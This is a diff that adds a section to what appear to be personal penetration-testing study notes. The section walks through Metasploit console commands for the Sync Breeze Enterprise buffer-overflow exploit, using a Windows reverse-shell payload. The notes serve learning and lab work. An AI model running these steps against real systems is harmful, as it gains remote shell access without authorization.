@@ -2555,6 +2555,24 @@ In production environments, domains typically have more than one domain controll
 
 ** Exploit Modules
 
+*** SincBreeze Enterprise
+    + src:
+    #+begin_src
+    msf5 > search syncbreeze
+      ## List of matching modules
+    msf5 > info exploit/windows/http/syncbreeze_bof
+      ## List of info
+    msf5 > use exploit/windows/http/syncbreeze_bof
+    msf5 exploit(windows/http/syncbreeze_bof) > show payloads
+    msf5 exploit(windows/http/syncbreeze_bof) > set payload windows/shell_reverse_tcp
+    msf5 exploit(windows/http/syncbreeze_bof) > show options
+    msf5 exploit(windows/http/syncbreeze_bof) > set ...
+    msf5 exploit(windows/http/syncbreeze_bof) > check
+      ## only work in special cases, e.g. if banner or other identifiable data.
+    msf5 exploit(windows/http/syncbreeze_bof) > run
+      ## if success, return reverse shell
+    #+end_src 
+
 
 * TODO list
   + AD, LDAP enum users
